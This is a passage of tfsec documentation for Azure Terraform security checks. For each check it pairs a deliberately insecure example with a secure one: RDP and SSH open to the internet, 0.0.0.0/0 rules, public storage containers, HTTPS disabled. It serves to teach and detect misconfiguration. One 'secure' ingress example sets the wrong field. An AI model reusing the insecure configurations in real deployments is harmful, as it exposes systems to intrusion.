{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/monitor/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/monitor/index.md", "content": "---\ntitle: monitor\n---\n\n# monitor\n\n## Checks\n\n\n- [activity-log-retention-set](activity-log-retention-set) Ensure the activity retention log is set to at least a year\n\n- [capture-all-activities](capture-all-activities) Ensure log profile captures all activities\n\n- [capture-all-regions](capture-all-regions) Ensure activitys are captured for all locations\n\n\n\n", "timestamp": "2025-10-24T22:24:50.040085"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/network/disable-rdp-from-internet/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/network/disable-rdp-from-internet/index.md", "content": "---\ntitle: RDP access should not be accessible from the Internet, should be blocked on port 3389\n---\n\n# RDP access should not be accessible from the Internet, should be blocked on port 3389\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nRDP access can be configured on either the network security group or in the network security group rule.\n\nRDP access should not be permitted from the internet (*, 0.0.0.0, /0, internet, any). Consider using the Azure Bastion Service.\n\n### Possible Impact\nAnyone from the internet can potentially RDP onto an instance\n\n### Suggested Resolution\nBlock RDP port from internet\n\n\n### Insecure Example\n\nThe following example will fail the azure-network-disable-rdp-from-internet check.\n```terraform\n\n resource \"azurerm_network_security_rule\" \"bad_example\" {\n      name                        = \"bad_example_security_rule\"\n      direction                   = \"Inbound\"\n      access                      = \"Allow\"\n      protocol                    = \"TCP\"\n      source_port_range           = \"*\"\n      destination_port_ranges     = [\"3389\"]\n      source_address_prefix       = \"*\"\n      destination_address_prefix  = \"*\"\n }\n \n resource \"azurerm_network_security_group\" \"example\" {\n   name                = \"tf-appsecuritygroup\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   \n   security_rule {\n \t source_port_range           = \"any\"\n      destination_port_ranges     = [\"3389\"]\n      source_address_prefix       = \"*\"\n      destination_address_prefix  = \"*\"\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-network-disable-rdp-from-internet check.\n```terraform\n\n resource \"azurerm_network_security_rule\" \"good_example\" {\n      name                        = \"good_example_security_rule\"\n      direction                   = \"Inbound\"\n      access                      = \"Allow\"\n      protocol                    = \"TCP\"\n      source_port_range           = \"*\"\n      destination_port_ranges     = [\"3389\"]\n      source_address_prefix       = \"4.53.160.75\"\n      destination_address_prefix  = \"*\"\n }\n \n resource \"azurerm_network_security_group\" \"example\" {\n   name                = \"tf-appsecuritygroup\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   \n   security_rule {\n \t source_port_range           = \"any\"\n      destination_port_ranges     = [\"3389\"]\n      source_address_prefix       = \"4.53.160.75\"\n      destination_address_prefix  = \"*\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/data-sources/network_security_group#security_rule](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/data-sources/network_security_group#security_rule){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule#source_port_ranges](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule#source_port_ranges){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/bastion/tutorial-create-host-portal](https://docs.microsoft.com/en-us/azure/bastion/tutorial-create-host-portal){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:50.526533"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/network/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/network/index.md", "content": "---\ntitle: network\n---\n\n# network\n\n## Checks\n\n\n- [disable-rdp-from-internet](disable-rdp-from-internet) RDP access should not be accessible from the Internet, should be blocked on port 3389\n\n- [no-public-egress](no-public-egress) An outbound network security rule allows traffic to /0.\n\n- [no-public-ingress](no-public-ingress) An inbound network security rule allows traffic from /0.\n\n- [retention-policy-set](retention-policy-set) Retention policy for flow logs should be enabled and set to greater than 90 days\n\n- [ssh-blocked-from-internet](ssh-blocked-from-internet) SSH access should not be accessible from the Internet, should be blocked on port 22\n\n\n\n", "timestamp": "2025-10-24T22:24:50.631818"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/network/no-public-egress/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/network/no-public-egress/index.md", "content": "---\ntitle: An outbound network security rule allows traffic to /0.\n---\n\n# An outbound network security rule allows traffic to /0.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nNetwork security rules should not use very broad subnets.\n\nWhere possible, segments should be broken into smaller subnets.\n\n### Possible Impact\nThe port is exposed for egress to the internet\n\n### Suggested Resolution\nSet a more restrictive cidr range\n\n\n### Insecure Example\n\nThe following example will fail the azure-network-no-public-egress check.\n```terraform\n\n resource \"azurerm_network_security_rule\" \"bad_example\" {\n \tdirection = \"Outbound\"\n \tdestination_address_prefix = \"0.0.0.0/0\"\n \taccess = \"Allow\"\n }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-network-no-public-egress check.\n```terraform\n\n resource \"azurerm_network_security_rule\" \"good_example\" {\n \tdirection = \"Outbound\"\n \tdestination_address_prefix = \"10.0.0.0/16\"\n \taccess = \"Allow\"\n }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/security/fundamentals/network-best-practices](https://docs.microsoft.com/en-us/azure/security/fundamentals/network-best-practices){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:50.906107"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/network/no-public-ingress/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/network/no-public-ingress/index.md", "content": "---\ntitle: An inbound network security rule allows traffic from /0.\n---\n\n# An inbound network security rule allows traffic from /0.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nNetwork security rules should not use very broad subnets.\n\nWhere possible, segments should be broken into smaller subnets.\n\n### Possible Impact\nThe port is exposed for ingress from the internet\n\n### Suggested Resolution\nSet a more restrictive cidr range\n\n\n### Insecure Example\n\nThe following example will fail the azure-network-no-public-ingress check.\n```terraform\n\n resource \"azurerm_network_security_rule\" \"bad_example\" {\n \tdirection = \"Inbound\"\n \tsource_address_prefix = \"0.0.0.0/0\"\n \taccess = \"Allow\"\n }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-network-no-public-ingress check.\n```terraform\n\n resource \"azurerm_network_security_rule\" \"good_example\" {\n \tdirection = \"Inbound\"\n \tdestination_address_prefix = \"10.0.0.0/16\"\n \taccess = \"Allow\"\n }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/security/fundamentals/network-best-practices](https://docs.microsoft.com/en-us/azure/security/fundamentals/network-best-practices){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:51.202440"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/network/retention-policy-set/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/network/retention-policy-set/index.md", "content": "---\ntitle: Retention policy for flow logs should be enabled and set to greater than 90 days\n---\n\n# Retention policy for flow logs should be enabled and set to greater than 90 days\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nFlow logs are the source of truth for all network activity in your cloud environment. \nTo enable analysis in security event that was detected late, you need to have the logs available. \n\t\t\t\nSetting an retention policy will help ensure as much information is available for review.\n\n### Possible Impact\nNot enabling retention or having short expiry on flow logs could lead to compromise being undetected limiting time for analysis\n\n### Suggested Resolution\nEnsure flow log retention is turned on with an expiry of >90 days\n\n\n### Insecure Example\n\nThe following example will fail the azure-network-retention-policy-set check.\n```terraform\n\nresource \"azurerm_network_watcher_flow_log\" \"bad_watcher\" {\n\tnetwork_watcher_name = \"bad_watcher\"\n\tresource_group_name = \"resource-group\"\n\n\tnetwork_security_group_id = azurerm_network_security_group.test.id\n\tstorage_account_id = azurerm_storage_account.test.id\n\tenabled = true\n\n\tretention_policy {\n\t\tenabled = true\n\t\tdays = 7\n\t}\n}\n\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-network-retention-policy-set check.\n```terraform\n\nresource \"azurerm_network_watcher_flow_log\" \"good_watcher\" {\n\tnetwork_watcher_name = \"good_watcher\"\n\tresource_group_name = \"resource-group\"\n\n\tnetwork_security_group_id = azurerm_network_security_group.test.id\n\tstorage_account_id = azurerm_storage_account.test.id\n\tenabled = true\n\n\tretention_policy {\n\t\tenabled = true\n\t\tdays = 90\n\t}\n}\n\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_watcher_flow_log#retention_policy](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_watcher_flow_log#retention_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/network-watcher/network-watcher-monitoring-overview](https://docs.microsoft.com/en-us/azure/network-watcher/network-watcher-monitoring-overview){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:51.474479"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/network/ssh-blocked-from-internet/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/network/ssh-blocked-from-internet/index.md", "content": "---\ntitle: SSH access should not be accessible from the Internet, should be blocked on port 22\n---\n\n# SSH access should not be accessible from the Internet, should be blocked on port 22\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nSSH access can be configured on either the network security group or in the network security group rule. \n\nSSH access should not be permitted from the internet (*, 0.0.0.0, /0, internet, any)\n\n### Possible Impact\nIts dangerous to allow SSH access from the internet\n\n### Suggested Resolution\nBlock port 22 access from the internet\n\n\n### Insecure Example\n\nThe following example will fail the azure-network-ssh-blocked-from-internet check.\n```terraform\n\n resource \"azurerm_network_security_rule\" \"bad_example\" {\n      name                        = \"bad_example_security_rule\"\n      direction                   = \"Inbound\"\n      access                      = \"Allow\"\n      protocol                    = \"TCP\"\n      source_port_range           = \"*\"\n      destination_port_range      = \"22\"\n      source_address_prefix       = \"*\"\n      destination_address_prefix  = \"*\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-network-ssh-blocked-from-internet check.\n```terraform\n\n resource \"azurerm_network_security_rule\" \"good_example\" {\n      name                        = \"good_example_security_rule\"\n      direction                   = \"Inbound\"\n      access                      = \"Allow\"\n      protocol                    = \"TCP\"\n      source_port_range           = \"*\"\n      destination_port_range      = \"22\"\n      source_address_prefix       = \"82.102.23.23\"\n      destination_address_prefix  = \"*\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/data-sources/network_security_group#security_rule](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/data-sources/network_security_group#security_rule){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule#source_port_ranges](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule#source_port_ranges){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:51.744107"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/security-center/alert-on-severe-notifications/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/security-center/alert-on-severe-notifications/index.md", "content": "---\ntitle: Send notification emails for high severity alerts\n---\n\n# Send notification emails for high severity alerts\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nIt is recommended that at least one valid contact is configured for the security center. \nMicrosoft will notify the security contact directly in the event of a security incident using email and require alerting to be turned on.\n\n### Possible Impact\nThe ability to react to high severity notifications could be delayed\n\n### Suggested Resolution\n Set alert notifications to be on\n\n\n### Insecure Example\n\nThe following example will fail the azure-security-center-alert-on-severe-notifications check.\n```terraform\n\n\t\tresource \"azurerm_security_center_contact\" \"bad_example\" {\n\t\temail = \"bad_example@example.com\"\n\t\tphone = \"+1-555-555-5555\"\n\n\t\talert_notifications = false\n\t\talerts_to_admins = false\n\t\t}\n\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-security-center-alert-on-severe-notifications check.\n```terraform\n\n\t\tresource \"azurerm_security_center_contact\" \"good_example\" {\n\t\temail = \"good_example@example.com\"\n\t\tphone = \"+1-555-555-5555\"\n\n\t\talert_notifications = true\n\t\talerts_to_admins = true\n\t\t}\n\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_contact#alert_notifications](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_contact#alert_notifications){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://azure.microsoft.com/en-us/services/security-center/](https://azure.microsoft.com/en-us/services/security-center/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:52.208620"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/security-center/enable-standard-subscription/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/security-center/enable-standard-subscription/index.md", "content": "---\ntitle: Enable the standard security center subscription tier\n---\n\n# Enable the standard security center subscription tier\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nTo benefit from Azure Defender you should use the Standard subscription tier.\n\t\t\t\n\t\t\tEnabling Azure Defender extends the capabilities of the free mode to workloads running in private and other public clouds, providing unified security management and threat protection across your hybrid cloud workloads.\n\n### Possible Impact\nUsing free subscription does not enable Azure Defender for the resource type\n\n### Suggested Resolution\nEnable standard subscription tier to benefit from Azure Defender\n\n\n### Insecure Example\n\nThe following example will fail the azure-security-center-enable-standard-subscription check.\n```terraform\n\n resource \"azurerm_security_center_subscription_pricing\" \"bad_example\" {\n   tier          = \"Free\"\n   resource_type = \"VirtualMachines\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-security-center-enable-standard-subscription check.\n```terraform\n\n resource \"azurerm_security_center_subscription_pricing\" \"good_example\" {\n   tier          = \"Standard\"\n   resource_type = \"VirtualMachines\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_subscription_pricing#tier](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_subscription_pricing#tier){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/security-center/security-center-pricing](https://docs.microsoft.com/en-us/azure/security-center/security-center-pricing){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:52.480107"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/security-center/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/security-center/index.md", "content": "---\ntitle: security-center\n---\n\n# security-center\n\n## Checks\n\n\n- [alert-on-severe-notifications](alert-on-severe-notifications) Send notification emails for high severity alerts\n\n- [enable-standard-subscription](enable-standard-subscription) Enable the standard security center subscription tier\n\n- [set-required-contact-details](set-required-contact-details) The required contact details should be set for security center\n\n\n\n", "timestamp": "2025-10-24T22:24:52.598918"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/security-center/set-required-contact-details/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/security-center/set-required-contact-details/index.md", "content": "---\ntitle: The required contact details should be set for security center\n---\n\n# The required contact details should be set for security center\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nIt is recommended that at least one valid contact is configured for the security center. \nMicrosoft will notify the security contact directly in the event of a security incident and will look to use a telephone number in cases where a prompt response is required.\n\n### Possible Impact\nWithout a telephone number set, Azure support can't contact\n\n### Suggested Resolution\nSet a telephone number for security center contact\n\n\n### Insecure Example\n\nThe following example will fail the azure-security-center-set-required-contact-details check.\n```terraform\n\n\t\tresource \"azurerm_security_center_contact\" \"bad_example\" {\n\t\temail = \"bad_contact@example.com\"\n\t\tphone = \"\"\n\n\t\talert_notifications = true\n\t\talerts_to_admins = true\n\t\t}\n\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-security-center-set-required-contact-details check.\n```terraform\n\n\t\tresource \"azurerm_security_center_contact\" \"good_example\" {\n\t\temail = \"good_contact@example.com\"\n\t\tphone = \"+1-555-555-5555\"\n\n\t\talert_notifications = true\n\t\talerts_to_admins = true\n\t\t}\n\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_contact#phone](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_contact#phone){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://azure.microsoft.com/en-us/services/security-center/](https://azure.microsoft.com/en-us/services/security-center/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:52.885419"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/storage/allow-microsoft-service-bypass/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/storage/allow-microsoft-service-bypass/index.md", "content": "---\ntitle: Trusted Microsoft Services should have bypass access to Storage accounts\n---\n\n# Trusted Microsoft Services should have bypass access to Storage accounts\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nSome Microsoft services that interact with storage accounts operate from networks that can't be granted access through network rules. \n\nTo help this type of service work as intended, allow the set of trusted Microsoft services to bypass the network rules\n\n### Possible Impact\nTrusted Microsoft Services won't be able to access storage account unless rules set to allow\n\n### Suggested Resolution\nAllow Trusted Microsoft Services to bypass\n\n\n### Insecure Example\n\nThe following example will fail the azure-storage-allow-microsoft-service-bypass check.\n```terraform\n\n resource \"azurerm_storage_account\" \"bad_example\" {\n   name                = \"storageaccountname\"\n   resource_group_name = azurerm_resource_group.example.name\n \n   location                 = azurerm_resource_group.example.location\n   account_tier             = \"Standard\"\n   account_replication_type = \"LRS\"\n \n   network_rules {\n     default_action             = \"Deny\"\n     ip_rules                   = [\"100.0.0.1\"]\n     virtual_network_subnet_ids = [azurerm_subnet.example.id]\n \tbypass                     = [\"Metrics\"]\n   }\n \n   tags = {\n     environment = \"staging\"\n   }\n }\n \n resource \"azurerm_storage_account_network_rules\" \"test\" {\n   resource_group_name  = azurerm_resource_group.test.name\n   storage_account_name = azurerm_storage_account.test.name\n \n   default_action             = \"Allow\"\n   ip_rules                   = [\"127.0.0.1\"]\n   virtual_network_subnet_ids = [azurerm_subnet.test.id]\n   bypass                     = [\"Metrics\"]\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-storage-allow-microsoft-service-bypass check.\n```terraform\n\n resource \"azurerm_storage_account\" \"good_example\" {\n   name                = \"storageaccountname\"\n   resource_group_name = azurerm_resource_group.example.name\n \n   location                 = azurerm_resource_group.example.location\n   account_tier             = \"Standard\"\n   account_replication_type = \"LRS\"\n \n   network_rules {\n     default_action             = \"Deny\"\n     ip_rules                   = [\"100.0.0.1\"]\n     virtual_network_subnet_ids = [azurerm_subnet.example.id]\n     bypass                     = [\"Metrics\", \"AzureServices\"]\n   }\n \n   tags = {\n     environment = \"staging\"\n   }\n }\n \n resource \"azurerm_storage_account_network_rules\" \"test\" {\n   resource_group_name  = azurerm_resource_group.test.name\n   storage_account_name = azurerm_storage_account.test.name\n \n   default_action             = \"Allow\"\n   ip_rules                   = [\"127.0.0.1\"]\n   virtual_network_subnet_ids = [azurerm_subnet.test.id]\n   bypass                     = [\"Metrics\", \"AzureServices\"]\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#bypass](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#bypass){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account_network_rules#bypass](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account_network_rules#bypass){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/storage/common/storage-network-security#trusted-microsoft-services](https://docs.microsoft.com/en-us/azure/storage/common/storage-network-security#trusted-microsoft-services){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:53.348907"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/storage/default-action-deny/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/storage/default-action-deny/index.md", "content": "---\ntitle: The default action on Storage account network rules should be set to deny\n---\n\n# The default action on Storage account network rules should be set to deny\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nThe default_action for network rules should come into effect when no other rules are matched.\n\nThe default action should be set to Deny.\n\n### Possible Impact\nNetwork rules that allow could cause data to be exposed publicly\n\n### Suggested Resolution\nSet network rules to deny\n\n\n### Insecure Example\n\nThe following example will fail the azure-storage-default-action-deny check.\n```terraform\n\n resource \"azurerm_storage_account_network_rules\" \"bad_example\" {\n   \n   default_action             = \"Allow\"\n   ip_rules                   = [\"127.0.0.1\"]\n   virtual_network_subnet_ids = [azurerm_subnet.test.id]\n   bypass                     = [\"Metrics\"]\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-storage-default-action-deny check.\n```terraform\n\n resource \"azurerm_storage_account_network_rules\" \"good_example\" {\n   \n   default_action             = \"Deny\"\n   ip_rules                   = [\"127.0.0.1\"]\n   virtual_network_subnet_ids = [azurerm_subnet.test.id]\n   bypass                     = [\"Metrics\"]\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account_network_rules#default_action](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account_network_rules#default_action){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/firewall/rule-processing](https://docs.microsoft.com/en-us/azure/firewall/rule-processing){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:53.614840"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/storage/enforce-https/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/storage/enforce-https/index.md", "content": "---\ntitle: Storage accounts should be configured to only accept transfers that are over secure connections\n---\n\n# Storage accounts should be configured to only accept transfers that are over secure connections\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nYou can configure your storage account to accept requests from secure connections only by setting the Secure transfer required property for the storage account. \n\nWhen you require secure transfer, any requests originating from an insecure connection are rejected. \n\nMicrosoft recommends that you always require secure transfer for all of your storage accounts.\n\n### Possible Impact\nInsecure transfer of data into secure accounts could be read if intercepted\n\n### Suggested Resolution\nOnly allow secure connection for transferring data into storage accounts\n\n\n### Insecure Example\n\nThe following example will fail the azure-storage-enforce-https check.\n```terraform\n\n resource \"azurerm_storage_account\" \"bad_example\" {\n   name                      = \"storageaccountname\"\n   resource_group_name       = azurerm_resource_group.example.name\n   location                  = azurerm_resource_group.example.location\n   account_tier              = \"Standard\"\n   account_replication_type  = \"GRS\"\n   enable_https_traffic_only = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-storage-enforce-https check.\n```terraform\n\n resource \"azurerm_storage_account\" \"good_example\" {\n   name                      = \"storageaccountname\"\n   resource_group_name       = azurerm_resource_group.example.name\n   location                  = azurerm_resource_group.example.location\n   account_tier              = \"Standard\"\n   account_replication_type  = \"GRS\"\n   enable_https_traffic_only = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#enable_https_traffic_only](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#enable_https_traffic_only){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/storage/common/storage-require-secure-transfer](https://docs.microsoft.com/en-us/azure/storage/common/storage-require-secure-transfer){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:53.959967"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/storage/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/storage/index.md", "content": "---\ntitle: storage\n---\n\n# storage\n\n## Checks\n\n\n- [allow-microsoft-service-bypass](allow-microsoft-service-bypass) Trusted Microsoft Services should have bypass access to Storage accounts\n\n- [default-action-deny](default-action-deny) The default action on Storage account network rules should be set to deny\n\n- [enforce-https](enforce-https) Storage accounts should be configured to only accept transfers that are over secure connections\n\n- [no-public-access](no-public-access) Storage containers in blob storage mode should not have public access\n\n- [queue-services-logging-enabled](queue-services-logging-enabled) When using Queue Services for a storage account, logging should be enabled.\n\n- [use-secure-tls-policy](use-secure-tls-policy) The minimum TLS version for Storage Accounts should be TLS1_2\n\n\n\n", "timestamp": "2025-10-24T22:24:54.082223"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/storage/no-public-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/storage/no-public-access/index.md", "content": "---\ntitle: Storage containers in blob storage mode should not have public access\n---\n\n# Storage containers in blob storage mode should not have public access\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nStorage container public access should be off. It can be configured for blobs only, containers and blobs or off entirely. The default is off, with no public access.\n\nExplicitly overriding publicAccess to anything other than off should be avoided.\n\n### Possible Impact\nData in the storage container could be exposed publicly\n\n### Suggested Resolution\nDisable public access to storage containers\n\n\n### Insecure Example\n\nThe following example will fail the azure-storage-no-public-access check.\n```terraform\n\n resource \"azurerm_storage_container\" \"bad_example\" {\n \tname                  = \"terraform-container-storage\"\n \tcontainer_access_type = \"blob\"\n \t\n \tproperties = {\n \t\t\"publicAccess\" = \"blob\"\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-storage-no-public-access check.\n```terraform\n\n resource \"azurerm_storage_container\" \"good_example\" {\n \tname                  = \"terraform-container-storage\"\n \tcontainer_access_type = \"private\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://www.terraform.io/docs/providers/azure/r/storage_container.html#properties](https://www.terraform.io/docs/providers/azure/r/storage_container.html#properties){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-configure?tabs=portal#set-the-public-access-level-for-a-container](https://docs.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-configure?tabs=portal#set-the-public-access-level-for-a-container){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:54.374455"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/storage/queue-services-logging-enabled/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/storage/queue-services-logging-enabled/index.md", "content": "---\ntitle: When using Queue Services for a storage account, logging should be enabled.\n---\n\n# When using Queue Services for a storage account, logging should be enabled.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nStorage Analytics logs detailed information about successful and failed requests to a storage service. \n\nThis information can be used to monitor individual requests and to diagnose issues with a storage service. \n\nRequests are logged on a best-effort basis.\n\n### Possible Impact\nLogging provides valuable information about access and usage\n\n### Suggested Resolution\nEnable logging for Queue Services\n\n\n### Insecure Example\n\nThe following example will fail the azure-storage-queue-services-logging-enabled check.\n```terraform\n\n resource \"azurerm_storage_account\" \"bad_example\" {\n     name                     = \"example\"\n     resource_group_name      = data.azurerm_resource_group.example.name\n     location                 = data.azurerm_resource_group.example.location\n     account_tier             = \"Standard\"\n     account_replication_type = \"GRS\"\n     queue_properties  {\n   }\n }\n\n  resource \"azurerm_storage_queue\" \"bad_example\" {\n\t name                 = \"my-queue\"\n\t storage_account_name  = azurerm_storage_account.bad_example.name\n  }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-storage-queue-services-logging-enabled check.\n```terraform\n\n resource \"azurerm_storage_account\" \"good_example\" {\n     name                     = \"example\"\n     resource_group_name      = data.azurerm_resource_group.example.name\n     location                 = data.azurerm_resource_group.example.location\n     account_tier             = \"Standard\"\n     account_replication_type = \"GRS\"\n     queue_properties  